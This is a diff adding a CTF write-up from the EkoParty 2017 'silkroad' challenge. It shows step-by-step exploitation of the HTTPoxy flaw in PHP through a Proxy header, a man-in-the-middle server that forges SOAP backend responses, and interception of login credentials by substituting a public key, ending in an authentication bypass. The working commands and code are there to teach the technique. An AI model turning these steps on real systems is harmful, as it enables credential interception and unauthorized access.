@@ -1,0 +1,357 @@
+---
+layout: post
+title:  "EkoParty CTF 2017 - silkroad"
+date:   2017-09-18 22:00
+categories: CTF
+tags: [EkoPartyCTF2017]
+categories: [web]
+author: jbz
+---
+
+> "We will never make the same mistakes again, we challenge you to read our messages and earn some BTCs!" - DPR <br/> https://silkroadzpvwzxxv.onion/
+
+
+![Login screen](https://github.com/jbzteam/CTF/blob/master/EkoParty2017/silkroad.png?raw=true)
+
+**TL;DR** HTTPoxy + MitM issuing a fake public key to encrypt/decrypt login data.
+
+
+At first we checked everything: if there were hidden informations in the captcha, if the site used CodeIgniter as the original SilkRoad, if there were ways to leak the original IP address (or the captcha as the feds would say) and even if any ip in the CTF responded something when setting the Host header as the onion domain.
+
+```
+$ torsocks curl -I https://silkroadzpvwzxxv.onion/ -k
+HTTP/1.1 200 OK
+Date: Mon, 18 Sep 2017 21:02:25 GMT
+Server: Apache
+Set-Cookie: PHPSESSID=70jbqb4u2gku02amp7dl4m3al3; path=/
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+X-Powered-By: PHP/7.0.8
+Content-Type: text/html; charset=UTF-8
+```
+
+That PHP version is old and has some known vulnerabilities, furthermore no other PHP challenges had that header exposed so we guessed it was there on purpose.  
+Checking PHP vulnerabilities we spotted the [HTTPoxy](https://httpoxy.org/) vuln and we gave it a shot:
+
+```
+$ torsocks curl -I -H 'Proxy: 127.0.0.1:1' https://silkroadzpvwzxxv.onion/ -k
+HTTP/1.0 500 Internal Server Error
+Date: Mon, 18 Sep 2017 21:04:38 GMT
+Server: Apache
+Set-Cookie: PHPSESSID=hh417rj6eotdp8v12fq0d1q8e5; path=/
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+X-Powered-By: PHP/7.0.8
+Connection: close
+Content-Type: text/html; charset=UTF-8
+```
+
+Since the proxy address is obviously not responding the server throws an error so it's probably vulnerable.
+Let's setup our simple proxy server and check what happens 
+
+```
+$ pip install proxy.py
+$ proxy.py --hostname 45.76.82.197 --log-level DEBUG --port 8080
+2017-09-18 21:07:10,010 - INFO - pid:23595 - Starting server on port 8080
+```
+
+```
+$ torsocks curl -i -s -k  -X 'POST' -H 'Proxy: 45.76.82.197:8080' -b 'PHPSESSID=99rl8ciaek2u1icsa90hodje55' --data-binary 'username=jbz&password=jbzpassword&captchainput=aKAjuE' https://silkroadzpvwzxxv.onion/
+HTTP/1.0 500 Internal Server Error
+Date: Mon, 18 Sep 2017 21:09:33 GMT
+Server: Apache
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+X-Powered-By: PHP/7.0.8
+Content-Length: 0
+Connection: close
+Content-Type: text/html; charset=UTF-8
+```
+
+While in the proxy log
+```
+017-09-18 21:09:33,974 - DEBUG - pid:23595 - Accepted connection <socket._socketobject object at 0x7f489a0b0de0> at address ('34.231.38.24', 43892)
+2017-09-18 21:09:33,977 - DEBUG - pid:23595 - Started process <Proxy(Proxy-3, started daemon)> to handle connection <socket._socketobject object at 0x7f489a0b0de0>
+2017-09-18 21:09:33,979 - DEBUG - pid:23619 - Proxying connection <socket._socketobject object at 0x7f489a0b0de0> at address ('34.231.38.24', 43892)
+2017-09-18 21:09:33,980 - DEBUG - pid:23619 - *** watching client for read ready
+2017-09-18 21:09:33,980 - DEBUG - pid:23619 - client is ready for reads, reading
+2017-09-18 21:09:33,981 - DEBUG - pid:23619 - rcvd 71 bytes from client
+2017-09-18 21:09:33,981 - DEBUG - pid:23619 - request parser is in state complete
+2017-09-18 21:09:33,981 - DEBUG - pid:23619 - connecting to server hiddenservicehost:443
+2017-09-18 21:09:33,982 - ERROR - pid:23619 - <ProxyConnectionFailed - hiddenservicehost:443 - error(111, 'Connection refused')>
+Traceback (most recent call last):
+  File "/usr/local/bin/proxy.py", line 447, in _process_rlist
+    self._process_request(data)
+  File "/usr/local/bin/proxy.py", line 378, in _process_request
+    raise ProxyConnectionFailed(host, port, repr(e))
+ProxyConnectionFailed: <ProxyConnectionFailed - hiddenservicehost:443 - error(111, 'Connection refused')>
+2017-09-18 21:09:33,984 - DEBUG - pid:23619 - flushed 106 bytes to client
+2017-09-18 21:09:33,984 - DEBUG - pid:23619 - closing client connection with pending client buffer size 0 bytes
+2017-09-18 21:09:33,984 - DEBUG - pid:23619 - closed client connection with pending server buffer size 0 bytes
+2017-09-18 21:09:33,984 - INFO - pid:23619 - 34.231.38.24:43892 - CONNECT hiddenservicehost:443
+2017-09-18 21:09:33,984 - DEBUG - pid:23619 - Closing proxy for connection <socket._socketobject object at 0x7f489a0b0de0> at address ('34.231.38.24', 43892)
+```
+
+So we know we have to setup an https service to handle the frontend requests.
+
+```
+$ echo '127.0.0.1 hiddenservicehost' > /etc/hosts'
+```
+
+And a simple python server to debug the requests
+```
+import BaseHTTPServer, SimpleHTTPServer
+from BaseHTTPServer import HTTPServer, BaseHTTPRequestHandler
+import ssl
+
+class RequestHandler(BaseHTTPRequestHandler):
+    
+    def do_GET(self):
+        
+        request_path = self.path
+        
+        print("\n----- Request Start ----->\n")
+        print(request_path)
+        print(self.headers)
+        print("<----- Request End -----\n")
+        
+        self.send_response(200)
+        self.send_header("Set-Cookie", "foo=bar")
+        
+    def do_POST(self):
+        
+        request_path = self.path
+        
+        print("\n----- Request Start ----->\n")
+        print(request_path)
+        
+        request_headers = self.headers
+        content_length = request_headers.getheaders('content-length')
+        length = int(content_length[0]) if content_length else 0
+        
+        print(request_headers)
+        print(self.rfile.read(length))
+        print("<----- Request End -----\n")
+        
+        self.send_response(200)
+
+    do_PUT = do_POST
+    do_DELETE = do_GET
+
+httpd = BaseHTTPServer.HTTPServer(('127.0.0.1', 443), RequestHandler)
+httpd.socket = ssl.wrap_socket (httpd.socket, certfile='server.pem', server_side=True)
+httpd.serve_forever()
+
+```
+
+So, let's shot again a login request and see what our fake backend outputs:
+
+```
+----- Request Start ----->
+
+/d90cdc7988b15060c1896126cee2eae9/hiddenservice_ws.php
+Host: hiddenservicehost
+Connection: close
+User-Agent: PHP-SOAP/7.0.22-0ubuntu0.17.04.1
+Content-Type: text/xml; charset=utf-8
+SOAPAction: "https://hiddenservicehost/d90cdc7988b15060c1896126cee2eae9/checkCaptchaWord"
+Content-Length: 574
+
+<?xml version="1.0" encoding="UTF-8"?>
+<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ns1="https://hiddenservicehost/d90cdc7988b15060c1896126cee2eae9/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><SOAP-ENV:Body><ns1:checkCaptchaWord><guid xsi:nil="true"/><word xsi:type="xsd:string">aKAjuE</word></ns1:checkCaptchaWord></SOAP-ENV:Body></SOAP-ENV:Envelope>
+
+<----- Request End -----
+```
+
+**NOTE**: *during most part of the ctf the `/d90cdc7988b15060c1896126cee2eae9/hiddenservice_ws.php`
+ endpoint was exposed and usable via the Hidden Service. On a few ours before the end the admin took the decision to disable it from outside usage so while we got the answer schema by querying the server the admins solutions implied to guess the server response schemas based only on fronted requests. As of the writing of this writeup this is indeed the case.*
+
+```
+ $ torsocks curl -X POST -k https://silkroadzpvwzxxv.onion/d90cdc7988b15060c1896126cee2eae9/hiddenservice_ws.php -H 'Host: hiddenservicehost' -H 'Content-Type: text/xml; charset=utf-8' -H 'SOAPAction: "https://hiddenservicehost/d90cdc7988b15060c1896126cee2eae9/getCaptchaWord"' --data $'<?xml version="1.0" encoding="UTF-8"?><SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ns1="https://hiddenservicehost/d90cdc7988b15060c1896126cee2eae9/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><SOAP-ENV:Body><ns1:checkCaptchaWord><guid xsi:nil="true"/><word xsi:type="xsd:string">aKAjuE</word></ns1:checkCaptchaWord></SOAP-ENV:Body></SOAP-ENV:Envelope>'
+<?xml version="1.0" encoding="UTF-8"?>
+
+
+<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ns1="http://localhost/" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><SOAP-ENV:Body><ns1:checkCaptchaWordResponse><return xsi:type="xsd:boolean">false</return></ns1:checkCaptchaWordResponse></SOAP-ENV:Body></SOAP-ENV:Envelope>
+```
+
+We can now forge a server response which can always validate the captcha by simply adding the following code to our python POST handler:
+
+```
+answer1 = '''<?xml version="1.0" encoding="UTF-8"?>
+<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ns1="http://localhost/" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><SOAP-ENV:Body><ns1:checkCaptchaWordResponse><return xsi:type="xsd:boolean">true</return></ns1:checkCaptchaWordResponse></SOAP-ENV:Body></SOAP-ENV:Envelope>
+'''
+....
+....
+
+        if 'checkCaptchaWord' in request_headers.getheaders('SOAPAction')[0]:
+            self.send_header("Content-Length", len(answer1))
+            self.end_headers()
+            self.wfile.write(answer1.encode('utf-8'))
+....
+```
+
+Sending another login request we can get a new message from the fronted:
+```
+----- Request Start ----->
+
+/d90cdc7988b15060c1896126cee2eae9/hiddenservice_ws.php
+Host: hiddenservicehost
+Connection: close
+User-Agent: PHP-SOAP/7.0.22-0ubuntu0.17.04.1
+Content-Type: text/xml; charset=utf-8
+SOAPAction: "https://hiddenservicehost/d90cdc7988b15060c1896126cee2eae9/getPublicKey"
+Content-Length: 545
+
+<?xml version="1.0" encoding="UTF-8"?>
+<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ns1="https://hiddenservicehost/d90cdc7988b15060c1896126cee2eae9/" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><SOAP-ENV:Body><ns1:getPublicKey><format xsi:type="xsd:string">PEM</format></ns1:getPublicKey></SOAP-ENV:Body></SOAP-ENV:Envelope>
+
+<----- Request End -----
+```
+
+By sending the same payload to the exposed service we again get to know a well formed response should look:
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ns1="http://localhost/" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><SOAP-ENV:Body><ns1:getPublicKeyResponse><return xsi:type="xsd:string">
+-----BEGIN PUBLIC KEY-----
+MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAyF8x65m1byr/HwPxWrcc
+RLyR0+z7hxLHo7wmPuJsaVlBhD0Rs9SDA1+0ZmphEYt7cOaNLvNdc+1dkfZirp3q
+d9jqrB0SAcTndM+HvkCsc4WHEXR2Lx20ZNr0fobK8FRFb6m3HLbz77Z/mUoiGFW/
+J6gqBcu3DXJ1MiVfqf6aVhmt1tVk1ccXPgSHBX3Bd0PA3XCxmKwBB2jBEJ0aVSB2
+mDN1slbGkh9MtHYnydmFLbXR77sY9piJbtwfYakTRivKtBJca9gWdFRkXxBD4FOu
+D4xGnyYguCRIANZmB8oz9qx2yTQk1487KAr5nJirY87r2S9bbfKwj43GQtTPsBrq
+fwIDAQAB
+-----END PUBLIC KEY-----
+</return></ns1:getPublicKeyResponse></SOAP-ENV:Body></SOAP-ENV:Envelope>
+```
+
+It's trivial to guess that the client will encrypt some data with the given key so wen faking the service we should replace this public key with our own. Code to add to the python server:
+
+```
+answer2 = '''<?xml version="1.0" encoding="UTF-8"?>
+<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ns1="http://localhost/" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><SOAP-ENV:Body><ns1:getPublicKeyResponse><return xsi:type="xsd:string">
+-----BEGIN PUBLIC KEY-----
+MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDFnjU14vTvZq4+0gnBfq12JGXB
+nvlFlVDfHa1YhIUyx850vrpja2Xi6LY6uWQ/SZwpZE6xu1MXWgN1ISshtQ6wtGvm
+rJW1kKBw8emcAPhDzfttmvZa5JrKCg3n8ZYdm/JCMUH/UFCDYGjrHXXm3fznAXIU
+7IFTmsCTB/mBmNHLjwIDAQAB
+-----END PUBLIC KEY-----
+</return></ns1:getPublicKeyResponse></SOAP-ENV:Body></SOAP-ENV:Envelope>
+'''
+....
+....
+
+        if 'getPublicKey' in request_headers.getheaders('SOAPAction')[0]:
+            self.send_header("Content-Length", len(answer2))
+            self.end_headers()
+            self.wfile.write(answer2.encode('utf-8'))
+....
+```
+
+Going on the client sends a new request:
+
+```
+----- Request Start ----->
+
+/d90cdc7988b15060c1896126cee2eae9/hiddenservice_ws.php
+Host: hiddenservicehost
+Connection: close
+User-Agent: PHP-SOAP/7.0.22-0ubuntu0.17.04.1
+Content-Type: text/xml; charset=utf-8
+SOAPAction: "https://hiddenservicehost/d90cdc7988b15060c1896126cee2eae9/checkCredentials"
+Content-Length: 1166
+
+<?xml version="1.0" encoding="UTF-8"?>
+<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ns1="https://hiddenservicehost/d90cdc7988b15060c1896126cee2eae9/" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><SOAP-ENV:Body><ns1:checkCredentials><username xsi:type="xsd:string">WsnnEjD+KH0F4V9eLPBRK72VcpJpfRU2vEivzpL7+HiQcBsOlaeMft0pixxFSlvTeXRaNSxKyDlzE9pfW8C15uOHIJknEhxCrjM9GPF5rbUB2DaxXlQcArOq1w68xL0FbiI/g0fDSojBjhrDeYchlRZ8cy8g+rnXayHPyQ9Vrk8=</username><password xsi:type="xsd:string">ZcOM2rTnF8veZttp7OitMMdu1vmvNpSQfCBoWEJK5G9S5mvjp213w+HRWTmPcttelW0DhNEvdaoAuERR+Pwi8mlfPe8PKUYgg1zjH3rNGei5hulmEB4SOvSxGiAcoZz0dy82cLWHXCkR+FKq8NpPuQ9Afv26vlnY2k5D2hS5LuY=</password><return_format xsi:type="xsd:string">v7cE7xIar5jgSnlj9Vqqc7w5iSp0mXr5j0ua0vCCs7k1qSMKMRQ0oPUdIIoFMR34cU3vtCxfQxheZoXv+lnt0KMoDVIo1+iZEBGJ2GvsXRlV9qwH7cled8AYcfmCoUYCfp2rhqe75gOzBL6CI1B6g1wQrUrzPv7qAnNI55FygVM=</return_format></ns1:checkCredentials></SOAP-ENV:Body></SOAP-ENV:Envelope>
+
+<----- Request End -----
+```
+
+The data is encrypted using the public key obtained from the previous request so it's trivial to decrypt:
+ * username: cleartext username sent in login
+ * password: cleartext password sent in login
+ * return_format: the string `'LEVEL#|#ACTIVE#|#USERNAME'`
+
+
+By letting the client encrypt the data with the original server key we captured an original login request and sent it to the exposed service in order to know how to build the response:
+
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ns1="http://localhost/" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><SOAP-ENV:Body><ns1:checkCredentialsResponse><return xsi:type="xsd:string">toZ5/qpcIXxS6bgQE8xSmLmqQjtexlrHN0XTMSV0MwH4shSKZNz4XSLPbAO60ct8lSEO2s+Ojc2Hwd1Ql+SC6v81mZTZZYWJeMG79AEtgLrLGGpNU2SYaTHZOASpa5MZ241ZJO6z76+k1XsI+YMQCwYiQ4n59RCHLyfyzuiKSnJQ7Jy1lRODdbZWtzbr477ZI5S7KxtR1o9YUHVhvXfEKmk9dHjeqnHlvQtxPd+uA8Sn/46pFLaXJGwdmpeVMTeP6XTfZpv7vk4AaTTGw2Pyl39ZZhPssM22Itb8jrkfI4EW/q4/M10rcVDKl75ZM+qBnHkH8RmVM4ttegVasCqjAUDEoPkNaHnFC5TSOhMMstwVIKozVYGokIqaZGVIL5RKGP0kNh8RYHEIjAqIbDJjCTHqC74jDYe3hKhwD5zk5YrQ7tt4hZRfWbL/mglozbhk8ovgGbaivgi01QnDSJXtVk1alSbWXIPLjtw027au3petNNWwgZf6mG9LQONZRIPYVIqD4c3u+tEvuzMIbmkbsCZq2vVU3gmZorGF+olZgCh3BNXl0VVqo3UysuO3xrdZtzNAYLhjnK1hAsEq+PxOJvTR28rqqKNNRrX4PAVlYlT5FP5tKVf/T2es6V5q63At/KPrd7kIGh1b2W6bWaTOO4MBL9Dh6Z5EWk/hhQhgoGk=</return></ns1:checkCredentialsResponse></SOAP-ENV:Body></SOAP-ENV:Envelope>
+```
+
+And the login page returned the message for the **wrong login/password combination** as we sent random login data.  
+
+At this point we were stuck: since the server sent a public key to the client but not vice versa we couldn't understand how the server response was encrypted.  
+**Injection** in the username or password fields when directly contacting the backend service **was not an option** since the fronted wasn't doing any additional sanitization and we already knew it was not vulnerable. We tried some time based payloads guessing that the fields in the return_format string might be column names used in a query without luck.
+Furthermore the admins disabled the public version of the service and it stopped responding so we thought the challenge was broken someway.
+
+*This part of the solution was provided by the admins after the challenge as ended.*
+
+It turned out **the server response was encrypted using the RSA private key and decrypted with the public key the frontend had.**  
+After understanding that the final step was to guess a return string for a successful login:
+
+ * `1338|true|dpr`
+ * `9000|1|admin`
+ * etc
+
+In order to make the challenge solvable some different input/formats were accepted.
+
+To encrypt with a RSA private key:
+```
+$ php -a 
+> openssl_private_encrypt('1338|true|dpr', $output, $key);
+> print(base64_encode($output));
+DpsMmtKXjaJXw0FQqhLSCTS+gQqztvRf3vGfY7WMNe7LQes/oQGqqkcbFcyOTn+UHqYLGhdZmgZ17OaaZn5Vd9Cyi/RYtRzculzzLlUuTFTZH+dLqBLQsOAzxytoVqse6hWxoWuzBl7e8Pby5i0PJxiZ52XOZe4QTT3f7u9PBXE=
+```
+
+Adding to the python server code:
+
+```
+answer3 = '''<?xml version="1.0" encoding="UTF-8"?>
+<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ns1="http://localhost/" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><SOAP-ENV:Body><ns1:checkCredentialsResponse><return xsi:type="xsd:string">
+DpsMmtKXjaJXw0FQqhLSCTS+gQqztvRf3vGfY7WMNe7LQes/oQGqqkcbFcyOTn+UHqYLGhdZmgZ17OaaZn5Vd9Cyi/RYtRzculzzLlUuTFTZH+dLqBLQsOAzxytoVqse6hWxoWuzBl7e8Pby5i0PJxiZ52XOZe4QTT3f7u9PBXE=
+</return></ns1:checkCredentialsResponse></SOAP-ENV:Body></SOAP-ENV:Envelope>
+'''
+....
+....
+
+        if 'checkCredentials' in request_headers.getheaders('SOAPAction')[0]:
+            self.send_header("Content-Length", len(answer3))
+            self.end_headers()
+            self.wfile.write(answer3.encode('utf-8'))
+....
+```
+
+
+By issuing a test login again using `dpr` as user:
+
+```
+----- Request Start ----->
+
+/d90cdc7988b15060c1896126cee2eae9/hiddenservice_ws.php
+Host: hiddenservicehost
+Connection: close
+User-Agent: PHP-SOAP/7.0.22-0ubuntu0.17.04.1
+Content-Type: text/xml; charset=utf-8
+SOAPAction: "https://hiddenservicehost/d90cdc7988b15060c1896126cee2eae9/getUserDetails"
+Content-Length: 722
+
+<?xml version="1.0" encoding="UTF-8"?>
+<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ns1="https://hiddenservicehost/d90cdc7988b15060c1896126cee2eae9/" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><SOAP-ENV:Body><ns1:getUserDetails><username xsi:type="xsd:string">HMJTPzzBtDSrF4F1S8IkpPkrntPSz8gEoW4RAiUw4lGqbZr2UTKO8P1KV7mOnRZuvZ6SlqOouY1XDmNWn15ttC2ssDx/GtkmMBA0vn3fW3O75f98sn/IpfI59Z4YgLJ2M6GG1Plp9DlqIE47B1KPpmJ0fh19BXFVdK+wPc/HCMo=</username></ns1:getUserDetails></SOAP-ENV:Body></SOAP-ENV:Envelope>
+
+<----- Request End -----
+```
+
+**The frontend has successfully validated the login** as is now trying to retrieve more records for the now logged in user. We can't answer that because we don't have such data but in fact we don't need to. By issuing another request with the same `PHPSESSID` cookie we can see that the previous procedure is skipped and only a `getUserDetails` requests is sent which means that our sessios is now authenticated.
+
+We should now be able to get the flag:
+
+```
+torsocks curl -i -s -k  -X $'GET' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0' -H $'Referer: https://silkroadzpvwzxxv.onion/' -H $'Upgrade-Insecure-Requests: 1' -b $'PHPSESSID=99rl8ciaek2u1icsa90hodje55'     $'https://silkroadzpvwzxxv.onion/' | grep EKO
+            {'user': 'FBINY', 'message': 'gotcha'},{'user': 'cirrus', 'message': 'hey man, this is what you are looking for EKO{dread_by_p0xy}'},
+```
+
+![Flag](https://github.com/jbzteam/CTF/blob/master/EkoParty2017/silkroad_flag.png?raw=true)
